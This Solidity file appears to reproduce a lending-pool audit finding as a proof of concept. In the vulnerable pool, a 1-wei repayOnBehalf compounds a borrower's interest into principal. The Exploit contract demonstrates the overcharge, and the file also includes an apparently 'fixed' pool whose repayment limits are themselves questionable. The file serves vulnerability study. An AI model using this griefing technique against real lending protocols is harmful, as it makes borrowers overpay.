// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum LendingPool — H-21 (Pashov, 2025-05-06), finding 66362.
    repayOnBehalf writes accrued interest into raw principal even when the
    repayment is 1 wei, so the total debt does not fall. Alice then owes
    1210 tokens instead of the fair 1200. The pasted calculateInsuranceFee
    block in the finding does not produce those figures; this file follows
    the published repayOnBehalf arithmetic. */

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendingPool {
    uint256 public constant RAY = 1e27;
    Token public asset;
    uint256 public usageIndex;
    mapping(address => uint256) public rawBalance;
    mapping(address => uint256) public positionIndex;

    constructor(Token _asset) {
        asset = _asset;
        usageIndex = RAY;
    }

    function borrow(address user, uint256 amount) external {
        require(rawBalance[user] == 0, "open");
        rawBalance[user] = amount;
        positionIndex[user] = usageIndex;
        require(asset.transfer(user, amount), "borrow");
    }

    function accrue(uint256 nextIndex) external {
        require(nextIndex >= usageIndex, "index");
        usageIndex = nextIndex;
    }

    function debtOf(address user) public view returns (uint256) {
        uint256 raw = rawBalance[user];
        if (raw == 0) return 0;
        return raw + (raw * (usageIndex - positionIndex[user])) / RAY;
    }

    function repayOnBehalf(address user, uint256 amount) external {
        uint256 raw = rawBalance[user];
        uint256 interest = (raw * (usageIndex - positionIndex[user])) / RAY;
        // @> VULN: a 1-wei repay writes all accrued interest into raw principal
        rawBalance[user] = raw + interest;
        positionIndex[user] = usageIndex;
        require(asset.transferFrom(msg.sender, address(this), amount), "dust");
    }

    function repay(uint256 amount) external {
        uint256 due = debtOf(msg.sender);
        require(amount == due, "due");
        require(asset.transferFrom(msg.sender, address(this), amount), "repay");
        rawBalance[msg.sender] = 0;
        positionIndex[msg.sender] = usageIndex;
    }
}

contract LendingPoolFixed {
    uint256 public constant RAY = 1e27;
    Token public asset;
    uint256 public usageIndex;
    mapping(address => uint256) public rawBalance;
    mapping(address => uint256) public positionIndex;

    constructor(Token _asset) {
        asset = _asset;
        usageIndex = RAY;
    }

    function borrow(address user, uint256 amount) external {
        rawBalance[user] = amount;
        positionIndex[user] = usageIndex;
        require(asset.transfer(user, amount), "borrow");
    }

    function accrue(uint256 nextIndex) external {
        usageIndex = nextIndex;
    }

    function debtOf(address user) public view returns (uint256) {
        uint256 raw = rawBalance[user];
        if (raw == 0) return 0;
        return raw + (raw * (usageIndex - positionIndex[user])) / RAY;
    }

    function repayOnBehalf(address user, uint256 amount) external {
        require(amount >= 1 ether, "min repay");
        uint256 raw = rawBalance[user];
        uint256 interest = (raw * (usageIndex - positionIndex[user])) / RAY;
        uint256 principal = raw + interest;
        require(amount < principal, "wipe");
        rawBalance[user] = principal - amount;
        positionIndex[user] = usageIndex;
        require(asset.transferFrom(msg.sender, address(this), amount), "dust");
    }
}

contract Borrower {
    function repayAll(LendingPool pool, Token asset) external {
        uint256 due = pool.debtOf(address(this));
        asset.approve(address(pool), due);
        pool.repay(due);
    }
}

contract Exploit {
    Token public asset;
    LendingPool public pool;
    Borrower public alice;
    uint256 public dustDebt;
    uint256 public finalDebt;
    uint256 public fairDebt;
    uint256 public poolTaken;

    constructor() {
        asset = new Token("RA");
        pool = new LendingPool(asset);
        alice = new Borrower();
        asset.mint(address(pool), 1000 ether);
        pool.borrow(address(alice), 1000 ether);
        asset.mint(address(alice), 210 ether);
        asset.mint(address(this), 1);
    }

    function run() external {
        pool.accrue(11 * 1e26);
        asset.approve(address(pool), 1);
        pool.repayOnBehalf(address(alice), 1);
        dustDebt = pool.debtOf(address(alice));
        pool.accrue(12 * 1e26);
        finalDebt = pool.debtOf(address(alice));
        fairDebt = 1000 ether + (1000 ether * (12 * 1e26 - 1e27)) / 1e27;
        alice.repayAll(pool, asset);
        poolTaken = asset.balanceOf(address(pool));
        require(pool.rawBalance(address(alice)) == 0, "closed");
        require(dustDebt == 1100 ether, "dust repay left the 1100 debt unchanged");
        require(pool.rawBalance(address(alice)) == 0, "alice closed");
        require(finalDebt == 1210 ether, "alice owes 1210");
        require(fairDebt == 1200 ether, "fair debt is 1200");
        require(finalDebt - fairDebt == 10 ether, "alice overpays by 10");
        require(poolTaken == finalDebt + 1, "pool took 1210 plus the 1 wei");
    }
}
